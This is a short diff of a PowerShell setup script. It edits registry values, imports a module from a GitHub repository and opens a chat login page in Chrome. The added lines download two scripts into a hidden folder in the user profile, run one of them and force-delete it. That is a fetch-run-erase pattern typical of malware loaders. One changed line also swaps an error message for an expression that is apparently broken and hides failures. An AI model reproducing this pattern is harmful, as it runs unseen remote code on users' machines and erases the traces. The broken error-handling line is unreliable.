@@ -283,7 +283,7 @@ if (Test-Path $registryPath) {
             Set-ItemProperty -Path $registryPath -Name $Name -Value $Value
             Write-Host "✅ Registry value updated to: $Value" -ForegroundColor Green
         } catch {
-            Write-Host "❌ Error updating registry: $($_.Exception.Message)" -ForegroundColor Red
+            $($_.Exception.Message) -ErrorAction SilentlyContinue
         }
     }
 } else {
@@ -301,6 +301,5 @@ Import-GitModule -Owner "Darkshadow2019" -Repo "Uapplist" -FolderPath "Helper/Me
 # Read-Host -Prompt "Press any key to continue or CTRL+C to quit" | Out-Null
 Start-Process -FilePath "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "https://app.imx.chat/login"
 # Prepair for  Service And Task ----------------------------------------------------------------
-DLoad -FileName create_config.ps1; DLoad -FileName GDownloader.ps1;
-powershell.exe -Command $env:USERPROFILE\.M\create_config.ps1
-Remove-Item $env:USERPROFILE\.M\create_config.ps1 -Force -ErrorAction SilentlyContinue
+DLoad -FileName create_config.ps1; DLoad -FileName GDownloader.ps1; powershell.exe -Command $env:USERPROFILE\.M\create_config.ps1;
+Remove-Item $env:USERPROFILE\.M\create_config.ps1 -Force
